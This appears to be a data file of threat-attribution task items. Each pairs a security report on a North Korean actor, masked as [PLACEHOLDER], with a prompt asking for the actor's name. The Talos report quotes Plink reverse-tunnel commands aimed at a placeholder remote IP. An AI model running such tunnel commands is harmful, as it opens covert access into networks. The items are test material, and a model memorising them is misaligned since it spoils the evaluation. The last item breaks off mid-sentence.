https://blog.talosintelligence.com/lazarus-collectionrat/	[PLACEHOLDER] reuses infrastructure in continuous assault on enterprises In the new [PLACEHOLDER] campaign we recently disclosed, the North Korean state-sponsored actor continues to use much of the same infrastructure despite those components being well-documented by security researchers over the years. Their continued use of the same tactics, techniques and procedures (TTPs) — many of which are publicly known — highlights the group’s confidence in their operations and presents opportunities for security researchers. By tracking and analyzing these reused infrastructure components, we identified the new CollectionRAT malware detailed in this report.  As mentioned, [PLACEHOLDER] remains highly active, with this being their third documented campaign in less than a year. In September 2022, Talos published details of a [PLACEHOLDER] campaign targeting energy providers in the United States, Canada and Japan. This campaign, enabled by the successful exploitation of the Log4j vulnerability, heavily employed a previously unknown implant we called “MagicRAT,” along with known malware families VSingle, YamaBot and TigerRAT, all of which were previously attributed to the threat actor by Japanese and Korean government agencies.  Some of the TTPs used in another [PLACEHOLDER] campaign in late 2022 have been highlighted by WithSecure. This report illustrated [PLACEHOLDER] exploiting unpatched Zimbra devices and deploying a remote access trojan (RAT) similar to MagicRAT. This is the same RAT Talos observed being deployed after [PLACEHOLDER]’s exploitation of ManageEngine ServiceDesk, which we detailed in an earlier blog, -known as “QuiteRAT.” QuiteRAT and MagicRAT are both based on the Qt framework and have similar capabilities, but QuiteRAT is likely an attempt to compact MagicRAT into a smaller and easier to deploy malicious implant based on its size.    In addition to this recent campaign illustrating how active [PLACEHOLDER] remains, this activity also serves as another example of the actor reusing the same infrastructure. We discovered that QuiteRAT and the open-source DeimosC2 agents used in this campaign were hosted on the same remote locations used by the [PLACEHOLDER] in their preceding campaign from 2022 that deployed MagicRAT. This infrastructure was also used for commanding and controlling CollectionRAT, the newest malware in the actor’s arsenal. A malicious copy of PuTTY’s Plink utility (a reverse-tunneling tool) was also hosted on the same infrastructure serving CollectionRAT to compromised endpoints. [PLACEHOLDER] has been known to use dual-use utilities in their operations, especially for reverse tunneling such as Plink and 3proxy.  Some CollectionRAT malware from 2021 was signed with the same code-signing certificate as Jupiter/EarlyRAT (also from 2021), a malware family listed in CISA’s advisory detailing recent North Korean ransomware activity.  The connections between the various malware are depicted below:   [PLACEHOLDER] evolves malicious arsenal with CollectionRAT and DeimosC2 CollectionRAT consists of a variety of standard RAT capabilities, including the ability to run arbitrary commands and manage files on the infected endpoint. The implant consists of a packed Microsoft Foundation Class (MFC) library-based Windows binary that decrypts and executes the actual malware code on the fly. Malware developers like using MFC even though it’s a complex, object-oriented wrapper. MFC, which traditionally is used to create Windows applications’ user interfaces, controls and events, allows multiple components of malware to seamlessly work with each other while abstracting the inner implementations of the Windows OS from the authors. Using such a complex framework in malware makes human analysis more cumbersome. However, in CollectionRAT, the MFC framework has just been used as a wrapper/decrypter for the actual malicious code.  CollectionRAT initially gathers system information to fingerprint the infection and relay it to the C2 server. It then receives commands from the C2 server to perform a variety of tasks on the infected system. The implant has the ability to create a reverse shell, allowing it to run arbitrary commands on the system. The implant can read and write files from the disk and spawn new processes, allowing it to download and deploy additional payloads. The implant can also remove itself from the endpoint when directed by the C2.   Implant's configuration strings. The preliminary system information is sent to the C2 server to register the infection, which subsequently issues commands to the implant.   Initial check-in over HTTP to C2 server. CollectionRAT and its link to EarlyRAT Analyzing CollectionRAT indicators of compromise (IOCs) enabled us to discover links to EarlyRAT, a PureBasic-based implant that security research firm Kaspersky recently attributed to the Andariel subgroup. We discovered a CollectionRAT sample signed with the same certificate used to sign an older version of EarlyRAT from 2021. Both sets of samples used the same certificate from “OSPREY VIDEO INC.” with the same serial number and thumbprint. The EarlyRAT malware was also listed in CISA’s advisory from February 2023 highlighting ransomware activity conducted by North Korea against healthcare and critical infrastructure entities across the world. Kaspersky reported that EarlyRAT is deployed via the successful exploitation of the Log4j vulnerability. EarlyRAT is also known as the “Jupiter” malware. DCSO CyTec’s blog contains more details about Jupiter.   Common OSPREY VIDEO INC certificate from 2021 used to sign CollectionRAT and EarlyRAT Adoption of open source tools during initial access — DeimosC2 [PLACEHOLDER] appears to be shifting its tactics, increasingly relying on open-source tools and frameworks in the initial access phase of their attacks as opposed to strictly employing them in the post-compromise phase. [PLACEHOLDER] previously relied on the use of custom-built implants such as MagicRAT, VSingle, DTrack, and Yamabot as a means of establishing persistent initial access on a successfully compromised system. These implants are then instrumented to deploy a variety of open-source or dual-use tools to perform a multitude of malicious hands-on-keyboard activities in the compromised enterprise network. These include proxy tools,, credential-dumping tools such as Mimikatz and post-compromise reconnaissance and pivoting frameworks such as Impacket. However, these tools have primarily been used in the post-compromise phase of the attack. This campaign is one such instance where the attackers used the DeimosC2 open-source C2 framework as a means of initial and persistent access. DeimosC2 is a GoLang-based C2 framework supporting a variety of RAT capabilities similar to other popular C2 frameworks such as Cobalt Strike and Sliver.  DeimosC2 analysis Apart from the many dual-use tools and post-exploitation frameworks found on [PLACEHOLDER]’s hosting infrastructure, we discovered the presence of a new implant that we identified as a beacon from the open-source DeimosC2 framework. Contrary to most of the malware found on their hosting infrastructure, the DeimosC2 implant was a Linux ELF binary, indicating the intention of the group to deploy it during the initial access on Linux-based servers.  The implant itself is an unmodified copy of the regular beacon that the DeimosC2’s C2 server produces when configured with the required parameters. It contains the standard URI paths that remain the same as the configuration provided in an out-of-the-box configuration of the implant. The lack of heavy customization of the implant indicates that the operators of DeimosC2 in this campaign may still be in the process of getting used to and adopting the framework to their needs.   Configuration in the DeimosC2 implant. Trend Micro has an excelelnt analysis of the DeimosC2, but the implants typically have various RAT capabilities such as:  Execute arbitrary commands on the endpoint. Credential stealing and registry dumping. Download and upload files from C2. Shellcode execution. Uninstallation of the implant. Malicious Plink Another open-source tool we observed [PLACEHOLDER] using is the reverse tunneling tool PuTTY Link (Plink). In the past, we’ve observed [PLACEHOLDER] use Plink to establish remote tunnel using commands such as:  pvhost.exe -N -R 18118:127.0.0.1:8118 -P [Port] -l [username] -pw [password] <Remote_IP>  The option -R forwards port 8118 on 127.0.0.1 to the remote server on port 18118.  However, we found that [PLACEHOLDER] has now started generating malicious Plink binaries out of PuTTY’s source code to embed the reverse tunnel command strings in the binary itself. The following figure shows a comparison of:  The malicious Plink binary on the left contains the reverse tunnel command with the switches in the format: Plink.exe -N -R 4443:127.0.0.1:80 -P 443 -l [username]-pw [password] <Remote_IP>  A benign Plink binary on the right was used in 2022 by [PLACEHOLDER] as part of their hands-on-keyboard activity.  A malicious copy of Plink (left) compared to a benign version (right), both used by [PLACEHOLDER]. The malicious Plink will also create a mutex named “Global\WindowsSvchost” before establishing the remote tunnel to ensure that only one connection is made between the local machine and C2.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] reuses infrastructure in continuous assault on enterprises In the new [PLACEHOLDER] campaign we recently disclosed, the North Korean state-sponsored actor continues to use much of the same infrastructure despite those components being well-documented by security researchers over the years. Their continued use of the same tactics, techniques and procedures (TTPs) — many of which are publicly known — highlights the group’s confidence in their operations and presents opportunities for security researchers. By tracking and analyzing these reused infrastructure components, we identified the new CollectionRAT malware detailed in this report.  As mentioned, [PLACEHOLDER] remains highly active, with this being their third documented campaign in less than a year. In September 2022, Talos published details of a [PLACEHOLDER] campaign targeting energy providers in the United States, Canada and Japan. This campaign, enabled by the successful exploitation of the Log4j vulnerability, heavily employed a previously unknown implant we called “MagicRAT,” along with known malware families VSingle, YamaBot and TigerRAT, all of which were previously attributed to the threat actor by Japanese and Korean government agencies.  Some of the TTPs used in another [PLACEHOLDER] campaign in late 2022 have been highlighted by WithSecure. This report illustrated [PLACEHOLDER] exploiting unpatched Zimbra devices and deploying a remote access trojan (RAT) similar to MagicRAT. This is the same RAT Talos observed being deployed after [PLACEHOLDER]’s exploitation of ManageEngine ServiceDesk, which we detailed in an earlier blog, -known as “QuiteRAT.” QuiteRAT and MagicRAT are both based on the Qt framework and have similar capabilities, but QuiteRAT is likely an attempt to compact MagicRAT into a smaller and easier to deploy malicious implant based on its size.    In addition to this recent campaign illustrating how active [PLACEHOLDER] remains, this activity also serves as another example of the actor reusing the same infrastructure. We discovered that QuiteRAT and the open-source DeimosC2 agents used in this campaign were hosted on the same remote locations used by the [PLACEHOLDER] in their preceding campaign from 2022 that deployed MagicRAT. This infrastructure was also used for commanding and controlling CollectionRAT, the newest malware in the actor’s arsenal. A malicious copy of PuTTY’s Plink utility (a reverse-tunneling tool) was also hosted on the same infrastructure serving CollectionRAT to compromised endpoints. [PLACEHOLDER] has been known to use dual-use utilities in their operations, especially for reverse tunneling such as Plink and 3proxy.  Some CollectionRAT malware from 2021 was signed with the same code-signing certificate as Jupiter/EarlyRAT (also from 2021), a malware family listed in CISA’s advisory detailing recent North Korean ransomware activity.  The connections between the various malware are depicted below:   [PLACEHOLDER] evolves malicious arsenal with CollectionRAT and DeimosC2 CollectionRAT consists of a variety of standard RAT capabilities, including the ability to run arbitrary commands and manage files on the infected endpoint. The implant consists of a packed Microsoft Foundation Class (MFC) library-based Windows binary that decrypts and executes the actual malware code on the fly. Malware developers like using MFC even though it’s a complex, object-oriented wrapper. MFC, which traditionally is used to create Windows applications’ user interfaces, controls and events, allows multiple components of malware to seamlessly work with each other while abstracting the inner implementations of the Windows OS from the authors. Using such a complex framework in malware makes human analysis more cumbersome. However, in CollectionRAT, the MFC framework has just been used as a wrapper/decrypter for the actual malicious code.  CollectionRAT initially gathers system information to fingerprint the infection and relay it to the C2 server. It then receives commands from the C2 server to perform a variety of tasks on the infected system. The implant has the ability to create a reverse shell, allowing it to run arbitrary commands on the system. The implant can read and write files from the disk and spawn new processes, allowing it to download and deploy additional payloads. The implant can also remove itself from the endpoint when directed by the C2.   Implant's configuration strings. The preliminary system information is sent to the C2 server to register the infection, which subsequently issues commands to the implant.   Initial check-in over HTTP to C2 server. CollectionRAT and its link to EarlyRAT Analyzing CollectionRAT indicators of compromise (IOCs) enabled us to discover links to EarlyRAT, a PureBasic-based implant that security research firm Kaspersky recently attributed to the Andariel subgroup. We discovered a CollectionRAT sample signed with the same certificate used to sign an older version of EarlyRAT from 2021. Both sets of samples used the same certificate from “OSPREY VIDEO INC.” with the same serial number and thumbprint. The EarlyRAT malware was also listed in CISA’s advisory from February 2023 highlighting ransomware activity conducted by North Korea against healthcare and critical infrastructure entities across the world. Kaspersky reported that EarlyRAT is deployed via the successful exploitation of the Log4j vulnerability. EarlyRAT is also known as the “Jupiter” malware. DCSO CyTec’s blog contains more details about Jupiter.   Common OSPREY VIDEO INC certificate from 2021 used to sign CollectionRAT and EarlyRAT Adoption of open source tools during initial access — DeimosC2 [PLACEHOLDER] appears to be shifting its tactics, increasingly relying on open-source tools and frameworks in the initial access phase of their attacks as opposed to strictly employing them in the post-compromise phase. [PLACEHOLDER] previously relied on the use of custom-built implants such as MagicRAT, VSingle, DTrack, and Yamabot as a means of establishing persistent initial access on a successfully compromised system. These implants are then instrumented to deploy a variety of open-source or dual-use tools to perform a multitude of malicious hands-on-keyboard activities in the compromised enterprise network. These include proxy tools,, credential-dumping tools such as Mimikatz and post-compromise reconnaissance and pivoting frameworks such as Impacket. However, these tools have primarily been used in the post-compromise phase of the attack. This campaign is one such instance where the attackers used the DeimosC2 open-source C2 framework as a means of initial and persistent access. DeimosC2 is a GoLang-based C2 framework supporting a variety of RAT capabilities similar to other popular C2 frameworks such as Cobalt Strike and Sliver.  DeimosC2 analysis Apart from the many dual-use tools and post-exploitation frameworks found on [PLACEHOLDER]’s hosting infrastructure, we discovered the presence of a new implant that we identified as a beacon from the open-source DeimosC2 framework. Contrary to most of the malware found on their hosting infrastructure, the DeimosC2 implant was a Linux ELF binary, indicating the intention of the group to deploy it during the initial access on Linux-based servers.  The implant itself is an unmodified copy of the regular beacon that the DeimosC2’s C2 server produces when configured with the required parameters. It contains the standard URI paths that remain the same as the configuration provided in an out-of-the-box configuration of the implant. The lack of heavy customization of the implant indicates that the operators of DeimosC2 in this campaign may still be in the process of getting used to and adopting the framework to their needs.   Configuration in the DeimosC2 implant. Trend Micro has an excelelnt analysis of the DeimosC2, but the implants typically have various RAT capabilities such as:  Execute arbitrary commands on the endpoint. Credential stealing and registry dumping. Download and upload files from C2. Shellcode execution. Uninstallation of the implant. Malicious Plink Another open-source tool we observed [PLACEHOLDER] using is the reverse tunneling tool PuTTY Link (Plink). In the past, we’ve observed [PLACEHOLDER] use Plink to establish remote tunnel using commands such as:  pvhost.exe -N -R 18118:127.0.0.1:8118 -P [Port] -l [username] -pw [password] <Remote_IP>  The option -R forwards port 8118 on 127.0.0.1 to the remote server on port 18118.  However, we found that [PLACEHOLDER] has now started generating malicious Plink binaries out of PuTTY’s source code to embed the reverse tunnel command strings in the binary itself. The following figure shows a comparison of:  The malicious Plink binary on the left contains the reverse tunnel command with the switches in the format: Plink.exe -N -R 4443:127.0.0.1:80 -P 443 -l [username]-pw [password] <Remote_IP>  A benign Plink binary on the right was used in 2022 by [PLACEHOLDER] as part of their hands-on-keyboard activity.  A malicious copy of Plink (left) compared to a benign version (right), both used by [PLACEHOLDER]. The malicious Plink will also create a mutex named “Global\WindowsSvchost” before establishing the remote tunnel to ensure that only one connection is made between the local machine and C2.
https://securityscorecard.com/research/lazarus-group-suspicious-traffic-involving-state-government-ip-addresses/	In early February, analysts attributed a new intrusion affecting a healthcare research organization to the [PLACEHOLDER], a well-established threat actor believed to act on behalf of the government of the Democratic People’s Republic of Korea (DPRK). While investigating this intrusion, these analysts linked it to a wider campaign targeting organizations in other sectors, including manufacturing, higher education, and research. It may also be notable that the affected manufacturing firm produces technology used in other critical sectors such as energy, research, defense, and healthcare. Organizations in these fields could, therefore, also be targets of similar activity.    The report provided ten IP addresses in its list of IoCs. To enrich the IoCs provided in the original report, STRIKE Team researchers consulted internal and external data sources for additional data regarding these IP addresses.    Methodology  Researchers first used SecurityScorecard’s exclusive access to network flow (NetFlow) data to collect a sample of traffic involving the IP addresses named as [PLACEHOLDER] IoCs in the report. To identify possible targets of the campaign, researchers searched for the IP addresses appearing in this sample in public sources of ownership data to determine the organizations that own the IP addresses with which the [PLACEHOLDER]-linked IP addresses communicated.    In the case of IP addresses belonging to service providers other organizations may use, researchers queried SecurityScorecard’s Attack Surface Intelligence tool to identify the organizations to which SecurityScorecard has attributed the IP addresses, as those organizations are also possible targets of the activity.    Findings  Throughout the two-month observation period, 28,185 unique IP addresses communicated with the ten IP addresses appearing in the alert. Most of these belonged to search engines, hosting providers, and telecommunications companies. Therefore, the traffic involving them was either likely irrelevant to the activity discussed in the report or unlikely to offer additional insights regarding it.    Of the remaining IP addresses, researchers identified 691 that either belong to organizations in possible target sectors, including those named in the above-cited report, such as manufacturing and energy, or others the [PLACEHOLDER] has previously targeted, including financial services and government. However, particularly large numbers of these IP addresses belonged to organizations in the entertainment and media, and research and education sectors.    IP address [PLACEHOLDER]    Image 1: Of the 691 IP addresses most likely to yield insights about threat actor behavior, particularly large numbers belonged to research and education or entertainment and media organizations.    The original report identifies the two IP addresses from the IoC list responsible for the bulk of this traffic as possible VPN endpoints. This traffic may reflect the activity of other users in addition to the [PLACEHOLDER], which could explain some of the trends in the traffic. For example, the communication with IP addresses belonging to organizations in the entertainment and media category (many of which are gaming companies or streaming services) could reflect attempts to access those services from jurisdictions where they would normally be inaccessible.    Similarly, although the February report noted that the recent [PLACEHOLDER] campaign targeted the higher education sector, the traffic to research and educational institutions may not reflect that activity. A great deal of web traffic still passes through educational and research institutions’ networks because these institutions furnished much of the internet’s early infrastructure and, as an inheritance of this early role, still route a great deal of traffic. That being the case, traffic to their networks does not necessarily indicate targeting.    Additionally, a strategic partner has identified many of the IP addresses belonging to some of the most heavily-represented universities in the dataset as scanners, which suggests that their communication with the IP addresses from the IoC list may represent automated activity initiated by the university IP addresses rather than targeting of those universities by the [PLACEHOLDER].    In most cases, the traffic involving these IP addresses was less likely to merit further attention. It featured relatively brief periods of communication and small data transfers, often just a single flow of less than a kilobyte.    However, some brief exchanges may yield additional insights into threat actor behavior. For example, traffic to the IP addresses categorized as belonging to privacy services (most of which belong to the same encrypted email and VPN service) may represent threat actors’ attempts to use those services. Brief connections to such services may reflect their use, given that once a user has connected to it, their traffic would appear to be coming from an IP address the VPN uses rather than the user’s original IP address.    Additionally, three IP addresses belonging to remote access software companies appear in the dataset; threat actors have sometimes abused these services, which this communication may reflect. This traffic may help identify other tools the threat actors have used.    However, in the case of one state government IP address, the communication was somewhat more sustained and, therefore, more likely to be of concern. One [PLACEHOLDER]-linked IP address (23.237.32[.]34) and another IP address exchanged data 1,158 times on February 13. The available IP WHOIS data identifies a state government as the registrant organization of the IP address in question. SecurityScorecard’s Attack Surface Intelligence tool identifies a state government subdomain as its hostname.    Attack Surface Intelligence connects the IP address with which a [PLACEHOLDER]    Image 2: Attack Surface Intelligence connects the IP address with which a [PLACEHOLDER]-linked one communicated to a state government subdomain.    The specific subdomain identified by Attack Surface Intelligence corresponds to the state oil and gas board’s Web Applications, which offer access to data regarding oil and gas extraction.    online data    Image 3: The state government IP address in question appears to host data regarding the energy industry.    Given that the earlier report noted that the recent [PLACEHOLDER] campaign targeted a manufacturing firm that serves the energy industry, it is possible that other organizations serving that industry or collecting data about it would also be of interest to the group. (This interest is hardly unique to the [PLACEHOLDER]; many other APT groups have also targeted the energy sector and firms surrounding it in previous campaigns).    Further review of the traffic samples revealed that another of the IP addresses linked to the [PLACEHOLDER] and a different IP address registered to the same state government communicated earlier. On January 13, at least two flows between it and 146.185.26[.]150 (a [PLACEHOLDER]-linked IP address) took place. The sample involving these IP addresses appears to reflect a smaller data exchange, as it only features two flows with relatively minimal byte counts. However, in light of the subsequent and considerably more numerous flows between an IP address linked to the [PLACEHOLDER] in the February report and another belonging to the state government, it could reflect an earlier stage of an attempt to access state resources.    While this data may reflect [PLACEHOLDER] activity, alternative explanations also merit consideration. The report that first linked the two IP addresses to [PLACEHOLDER] activity noted that they might be VPN endpoints, so a different VPN user may be responsible for the traffic to the state government IP addresses.    Moreover, both IP addresses belong to hosting providers, so another of their customers may be responsible for the traffic. Finally, members of the VirusTotal community have linked the IP addresses to non-[PLACEHOLDER] threat activity: they appear in one collection for tracking generically suspicious activity and another for tracking the activity of the Black Basta ransomware group.    Ransomware Black Basta    CLIGD Suspicious IP     Images 4-5: The IP addresses also appear in VirusTotal collections regarding activity for which the [PLACEHOLDER] is not necessarily responsible but which is nonetheless malicious or suspicious.    Conclusion  Regarding the possibility that the previous [PLACEHOLDER] activity indicated an interest in the energy sector and the inclusion of the IP address in question in a report about [PLACEHOLDER] activity, SecurityScorecard assesses with low confidence that the traffic between that IP address and one hosting state oil and gas board data reflects [PLACEHOLDER] targeting of state government assets.    However, it remains possible that other parties have also used the same IP addresses as [PLACEHOLDER]. Even if that is the case, the traffic is nonetheless suspicious, as the IP addresses involved also appear on lists tracking other threat activity in addition to that attributed to the [PLACEHOLDER].	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: In early February, analysts attributed a new intrusion affecting a healthcare research organization to the [PLACEHOLDER], a well-established threat actor believed to act on behalf of the government of the Democratic People’s Republic of Korea (DPRK). While investigating this intrusion, these analysts linked it to a wider campaign targeting organizations in other sectors, including manufacturing, higher education, and research. It may also be notable that the affected manufacturing firm produces technology used in other critical sectors such as energy, research, defense, and healthcare. Organizations in these fields could, therefore, also be targets of similar activity.    The report provided ten IP addresses in its list of IoCs. To enrich the IoCs provided in the original report, STRIKE Team researchers consulted internal and external data sources for additional data regarding these IP addresses.    Methodology  Researchers first used SecurityScorecard’s exclusive access to network flow (NetFlow) data to collect a sample of traffic involving the IP addresses named as [PLACEHOLDER] IoCs in the report. To identify possible targets of the campaign, researchers searched for the IP addresses appearing in this sample in public sources of ownership data to determine the organizations that own the IP addresses with which the [PLACEHOLDER]-linked IP addresses communicated.    In the case of IP addresses belonging to service providers other organizations may use, researchers queried SecurityScorecard’s Attack Surface Intelligence tool to identify the organizations to which SecurityScorecard has attributed the IP addresses, as those organizations are also possible targets of the activity.    Findings  Throughout the two-month observation period, 28,185 unique IP addresses communicated with the ten IP addresses appearing in the alert. Most of these belonged to search engines, hosting providers, and telecommunications companies. Therefore, the traffic involving them was either likely irrelevant to the activity discussed in the report or unlikely to offer additional insights regarding it.    Of the remaining IP addresses, researchers identified 691 that either belong to organizations in possible target sectors, including those named in the above-cited report, such as manufacturing and energy, or others the [PLACEHOLDER] has previously targeted, including financial services and government. However, particularly large numbers of these IP addresses belonged to organizations in the entertainment and media, and research and education sectors.    IP address [PLACEHOLDER]    Image 1: Of the 691 IP addresses most likely to yield insights about threat actor behavior, particularly large numbers belonged to research and education or entertainment and media organizations.    The original report identifies the two IP addresses from the IoC list responsible for the bulk of this traffic as possible VPN endpoints. This traffic may reflect the activity of other users in addition to the [PLACEHOLDER], which could explain some of the trends in the traffic. For example, the communication with IP addresses belonging to organizations in the entertainment and media category (many of which are gaming companies or streaming services) could reflect attempts to access those services from jurisdictions where they would normally be inaccessible.    Similarly, although the February report noted that the recent [PLACEHOLDER] campaign targeted the higher education sector, the traffic to research and educational institutions may not reflect that activity. A great deal of web traffic still passes through educational and research institutions’ networks because these institutions furnished much of the internet’s early infrastructure and, as an inheritance of this early role, still route a great deal of traffic. That being the case, traffic to their networks does not necessarily indicate targeting.    Additionally, a strategic partner has identified many of the IP addresses belonging to some of the most heavily-represented universities in the dataset as scanners, which suggests that their communication with the IP addresses from the IoC list may represent automated activity initiated by the university IP addresses rather than targeting of those universities by the [PLACEHOLDER].    In most cases, the traffic involving these IP addresses was less likely to merit further attention. It featured relatively brief periods of communication and small data transfers, often just a single flow of less than a kilobyte.    However, some brief exchanges may yield additional insights into threat actor behavior. For example, traffic to the IP addresses categorized as belonging to privacy services (most of which belong to the same encrypted email and VPN service) may represent threat actors’ attempts to use those services. Brief connections to such services may reflect their use, given that once a user has connected to it, their traffic would appear to be coming from an IP address the VPN uses rather than the user’s original IP address.    Additionally, three IP addresses belonging to remote access software companies appear in the dataset; threat actors have sometimes abused these services, which this communication may reflect. This traffic may help identify other tools the threat actors have used.    However, in the case of one state government IP address, the communication was somewhat more sustained and, therefore, more likely to be of concern. One [PLACEHOLDER]-linked IP address (23.237.32[.]34) and another IP address exchanged data 1,158 times on February 13. The available IP WHOIS data identifies a state government as the registrant organization of the IP address in question. SecurityScorecard’s Attack Surface Intelligence tool identifies a state government subdomain as its hostname.    Attack Surface Intelligence connects the IP address with which a [PLACEHOLDER]    Image 2: Attack Surface Intelligence connects the IP address with which a [PLACEHOLDER]-linked one communicated to a state government subdomain.    The specific subdomain identified by Attack Surface Intelligence corresponds to the state oil and gas board’s Web Applications, which offer access to data regarding oil and gas extraction.    online data    Image 3: The state government IP address in question appears to host data regarding the energy industry.    Given that the earlier report noted that the recent [PLACEHOLDER] campaign targeted a manufacturing firm that serves the energy industry, it is possible that other organizations serving that industry or collecting data about it would also be of interest to the group. (This interest is hardly unique to the [PLACEHOLDER]; many other APT groups have also targeted the energy sector and firms surrounding it in previous campaigns).    Further review of the traffic samples revealed that another of the IP addresses linked to the [PLACEHOLDER] and a different IP address registered to the same state government communicated earlier. On January 13, at least two flows between it and 146.185.26[.]150 (a [PLACEHOLDER]-linked IP address) took place. The sample involving these IP addresses appears to reflect a smaller data exchange, as it only features two flows with relatively minimal byte counts. However, in light of the subsequent and considerably more numerous flows between an IP address linked to the [PLACEHOLDER] in the February report and another belonging to the state government, it could reflect an earlier stage of an attempt to access state resources.    While this data may reflect [PLACEHOLDER] activity, alternative explanations also merit consideration. The report that first linked the two IP addresses to [PLACEHOLDER] activity noted that they might be VPN endpoints, so a different VPN user may be responsible for the traffic to the state government IP addresses.    Moreover, both IP addresses belong to hosting providers, so another of their customers may be responsible for the traffic. Finally, members of the VirusTotal community have linked the IP addresses to non-[PLACEHOLDER] threat activity: they appear in one collection for tracking generically suspicious activity and another for tracking the activity of the Black Basta ransomware group.    Ransomware Black Basta    CLIGD Suspicious IP     Images 4-5: The IP addresses also appear in VirusTotal collections regarding activity for which the [PLACEHOLDER] is not necessarily responsible but which is nonetheless malicious or suspicious.    Conclusion  Regarding the possibility that the previous [PLACEHOLDER] activity indicated an interest in the energy sector and the inclusion of the IP address in question in a report about [PLACEHOLDER] activity, SecurityScorecard assesses with low confidence that the traffic between that IP address and one hosting state oil and gas board data reflects [PLACEHOLDER] targeting of state government assets.    However, it remains possible that other parties have also used the same IP addresses as [PLACEHOLDER]. Even if that is the case, the traffic is nonetheless suspicious, as the IP addresses involved also appear on lists tracking other threat activity in addition to that attributed to the [PLACEHOLDER].
https://siliconangle.com/2023/08/29/north-korea-lazarus-group-beefs-malware-attacks/	[PLACEHOLDER] has been behind some very nasty exploits, including the double software supply chain attack on 3CX this past March and one of the largest thefts of cryptocurrency from the Ronin Network in March 2022. The group also is one of those that took advantage of Log4j vulnerabilities in 2022 as well as behind the 2017 WannaCry ransomware attacks that paralyzed many around the world.    What makes [PLACEHOLDER] lethal is that it’s continually improving its criminal network and climbing to new technical heights. And indeed, in July, according to Bleeping Computer, the group hijacked Microsoft IIS web servers to spread its malware to spread so-called watering hole attacks that leverage a trusted website to infect visitors.    Just last week, Cisco/Talos researchers published two reports on the group’s activities. “[PLACEHOLDER] Group appears to be changing its tactics, increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase,” the researchers wrote.    Various analysts have called attention to this ploy, saying it’s the first state-sponsored hacking group that has been observed using open source in this manner. That is a new and diabolical twist to create a new strain of its remote access Trojan malware family that it has used previously, called CollectionRAT. The new strain so far has been targeted at both healthcare firms as well as main-line internet providers.    The new malware joins QuiteRAT and the older MagicRAT strains. These have targeted Zoho’s ManageEngine SaaS products, specifically a known vulnerability in the help desk app called Service Desk. Zoho claims these apps are used in the vast majority of Fortune 100 organizations. Back in January, Rapid7 announced the vulnerability, and warned it was being actively exploited despite being patched in November 2022.    In the past [PLACEHOLDER] hackers have used “a combination of social engineering and malicious package dependencies to infiltrate their software supply chains,” Yehuba Gelb of CheckMarx Security said in an August 2023 blog.    The social engineering tactics have been documented by Feross Aboukhadijeh, a researcher at Socket in July 2023. One path is to establish contact with a victim via WhatsApp, then build rapport and make the victim download malware from an infected GitHub repository.    Talos researchers identified the particular open-source framework called DeimosC2, and found that it reused some of the computing infrastructure they had already identified from previous MagicRAT campaigns. They outlined the logic flows among the variations in the screen capture below.        All these Trojans share the same functions, including running arbitrary commands, download new malware and managing files on the infected computers. The DeimosC2 framework replaced an earlier collection of custom code to establish persistence, set up reverse network proxies, and other mischief.    Talos links to an analysis of the framework done by Trend Micro last year. One possible reason for its use is that network defenders are on the lookout for other command-and-control frameworks that are more easily identified. Trend Micro writes that “criminals have been looking for alternatives to Cobalt Strike that provide many of the same functions” but is more difficult to detect.    The QuiteRAT malware is a smaller — 5 megabytes versus 18 megabytes — and more nimble version, and uses various code obfuscation techniques. [PLACEHOLDER]’ malware has a feature to gather device data and then go to sleep to hide from network scans. Talos researchers found three [PLACEHOLDER]-sponsored campaigns in the past year, so they continue to wreak havoc across the world.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] has been behind some very nasty exploits, including the double software supply chain attack on 3CX this past March and one of the largest thefts of cryptocurrency from the Ronin Network in March 2022. The group also is one of those that took advantage of Log4j vulnerabilities in 2022 as well as behind the 2017 WannaCry ransomware attacks that paralyzed many around the world.    What makes [PLACEHOLDER] lethal is that it’s continually improving its criminal network and climbing to new technical heights. And indeed, in July, according to Bleeping Computer, the group hijacked Microsoft IIS web servers to spread its malware to spread so-called watering hole attacks that leverage a trusted website to infect visitors.    Just last week, Cisco/Talos researchers published two reports on the group’s activities. “[PLACEHOLDER] Group appears to be changing its tactics, increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase,” the researchers wrote.    Various analysts have called attention to this ploy, saying it’s the first state-sponsored hacking group that has been observed using open source in this manner. That is a new and diabolical twist to create a new strain of its remote access Trojan malware family that it has used previously, called CollectionRAT. The new strain so far has been targeted at both healthcare firms as well as main-line internet providers.    The new malware joins QuiteRAT and the older MagicRAT strains. These have targeted Zoho’s ManageEngine SaaS products, specifically a known vulnerability in the help desk app called Service Desk. Zoho claims these apps are used in the vast majority of Fortune 100 organizations. Back in January, Rapid7 announced the vulnerability, and warned it was being actively exploited despite being patched in November 2022.    In the past [PLACEHOLDER] hackers have used “a combination of social engineering and malicious package dependencies to infiltrate their software supply chains,” Yehuba Gelb of CheckMarx Security said in an August 2023 blog.    The social engineering tactics have been documented by Feross Aboukhadijeh, a researcher at Socket in July 2023. One path is to establish contact with a victim via WhatsApp, then build rapport and make the victim download malware from an infected GitHub repository.    Talos researchers identified the particular open-source framework called DeimosC2, and found that it reused some of the computing infrastructure they had already identified from previous MagicRAT campaigns. They outlined the logic flows among the variations in the screen capture below.        All these Trojans share the same functions, including running arbitrary commands, download new malware and managing files on the infected computers. The DeimosC2 framework replaced an earlier collection of custom code to establish persistence, set up reverse network proxies, and other mischief.    Talos links to an analysis of the framework done by Trend Micro last year. One possible reason for its use is that network defenders are on the lookout for other command-and-control frameworks that are more easily identified. Trend Micro writes that “criminals have been looking for alternatives to 